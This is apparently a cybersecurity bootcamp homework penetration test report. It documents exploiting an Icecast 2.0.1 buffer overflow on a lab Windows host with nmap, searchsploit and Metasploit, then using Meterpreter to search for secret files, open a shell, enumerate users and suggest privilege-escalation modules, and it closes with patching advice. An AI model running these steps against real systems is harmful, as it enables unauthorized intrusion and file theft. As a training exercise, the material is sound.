


> Written with [StackEdit](https://stackedit.io/).
# GoodSecurity Penetration Test Report-2  WEEK-17


  

H-JAVID[@GoodSecurity.com](mailto:YOURNAMEHERE@GoodSecurity.com)

DATE:10/13/2021

  # 1. High-Level Summary
    

  

GoodSecurity was tasked with performing an internal penetration test on GoodCorp’s CEO, Hans Gruber. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Hans’ computer and determine if it is at risk. GoodSecurity’s overall objective was to exploit any vulnerable software and find the secret recipe file on Hans’ computer, while reporting the findings back to GoodCorp.

When performing the internal penetration test, there were several alarming vulnerabilities that were

identified on Hans’ desktop. When performing the attacks, GoodSecurity was able to gain access to his machine and find the secret recipe file by exploiting two programs that had major vulnerabilities. The details of the attack can be found in the ‘Findings’ category.

  
  
  
  
  
  
  
  
  
  
  
  
  
  

# 2.Findings
    

  

**Machine IP:**

Machine’s IP address: `192.168.0.20`

**Hostname:**

Actual name of the machine  `MSEDGEWIN10`

**Vulnerability Exploited:**

The name of the script or Metasploit module used :

    Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit).
   Metasploit module used :
 

-      exploit/windows/http_header 2004-09-28 
 -       Description:Icecast Header Overwrite

**Vulnerability Explanation:**

Explain the vulnerability as best you can by explaining the attack type (i.e. is it a heap overflow attack, buffer overflow, file inclusion, etc.?) and briefly summarize what that attack is (Might need Google’s help!)
## Name: Icecast Header Overwrite:
#### Description:1


| Disclosed | Created |Platform |
|--|--|--|
| 09/28/2004 | 05/30/2018 | Windows


This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool.

Author(s)

-   spoonm <spoonm@no$email.com>
-   Luigi Auriemma <aluigi@autistici.org>
#### Description:2
The Icecast application running on 192.168.0.20 allows for a buffer overflow exploit in which, an attacker can **remotely gain control of the victim’s system** by overwriting the memory on the system utilizing the Icecast flaw, which writes past the end of a pointer array when receiving 32 HTTP headers.

Some remote HACKING able to be executed are:

-   File discovery and exfiltration
-   Key logging and screen capture
-   Privilege escalation to Administrator



**Severity:**
##### -In your expert opinion, how severe is this vulnerability?
> Answer: Severity= 7.5


![CVE Details](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/CVE%20Details.PNG)





> Answer: Severity=8.1


![Severity-NVD](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Severity-NVD.PNG)


## Proof of Concept:

#### This is where you show the steps you took. Show the client how you exploited the software services. Please include screenshots!

### Instructions

We've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1.  I Performed a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: `nmap -sS -O -sV 192.168.0.20 `

 ![b1](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b1.jpg)
 
 
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > Answer: `searchsploit -t Icecast windows`


![b2](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b2.PNG)




3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: `msfconsole`


 ![b3](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b3.PNG)
 
 
 
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: msf5 > `search Icecast`


 ![b4](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b4.PNG)



   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: msf5 > `use 0`


 ![b4-note](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b4-note.PNG)
 
 
 
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`: 
      
     > Answer:  `set RHOSTS 192.168.0.20`


 ![b5](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b5.PNG)
 
 
 
 
 
 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: `exploit`


 ![b6-1](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b6-1.PNG)
 
 
 
 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: `search -f *secret*.txt`


 ![b6-2](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b6-2.PNG) 
 
 
 
 
 
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer:  `search -f *recipe.txt*`


 ![b7-1](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b7-1.PNG)
 
 
 
 
 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:


      > Answer:  `search -f *recipe*.txt*`
      
      
 ![b7-2](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b7-2.PNG)
 
 
 
 
 
 
 - **Bonus2(By-me)**:


 - ![meterpreter>shell](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/meterpreter-shell.PNG)
 - ![Drink-Recipe](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Drink-RECIPE.PNG)
 - ![Password.txt](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/PASSWD.PNG)
 - ![Secretfile](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Secretfile.PNG)






8. You can also use Meterpreter's local exploit suggester to find possible exploits.
  > Answer: meterpreter > `run post/multi/recon/local_exploit_suggester`


 ![b8](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b8.PNG)
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.






 
#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer: meterpreter > `run post/windows/gather/enum_logged_on_users`


 ![Bonus-A](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Bonus-A.PNG)
 
 
 
 
     
B. Open a Meterpreter shell and gather system information for the target.


 
  > Answer:  meterpreter > `shell `![Bonus-B-1(shell)](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Bonus-B-1.PNG)


     
  > Answer:  meterpreter > `sysinfo `![Bonus-sysinfo](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/sysinfo.PNG)





C. Run the command that displays the target's computer system information:

   > Answer: `systeminfo`


![Bonus-c](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Bonus-c.PNG)



##### There should be a separate finding for each vulnerability found!
###### The system was also found to be vulnerable to the following exploits:

  > Answer: -  `exploit/windows/local/ikeext_service`

> Answer:-   `exploit/windows/local/ms16_075_reflection`
  
  
  
  
  
  
  
  
  

 # 3.Recommendations
    

  

##### What recommendations would you give to GoodCorp?
> Answer: - The Icecast exploit is an old vulnerability that can be fixed with a patch. 

 > Answer: -  Install the latest version and update all software and services on the system.

> Answer: - Encrypt all files/folders that you want to keep a secret. and try to change names such as "secret", ... 

> Answer: - Enable your windows firewall with rules to only explicitly allow traffic on needed ports.

&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.

